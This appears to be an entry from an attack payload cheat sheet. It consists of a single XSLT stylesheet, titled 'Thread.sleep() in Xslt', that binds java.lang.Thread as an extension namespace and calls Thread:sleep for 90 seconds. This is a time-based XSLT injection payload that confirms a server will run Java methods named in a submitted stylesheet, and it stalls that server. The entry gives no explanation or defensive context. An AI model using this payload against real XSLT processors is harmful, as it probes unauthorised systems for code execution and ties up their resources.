# XML and XSLT

## Thread.sleep() in Xslt
```xml
    <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:Thread="java.lang.Thread" version="1.0">
      <xsl:output method="xml" encoding="UTF-8"/>
      <xsl:param name="time.in.millis" select="'90000'"/>
      <xsl:template match="/">
        <xsl:value-of select="Thread:sleep(number($time.in.millis))"/>
      </xsl:template>
    </xsl:stylesheet>
```
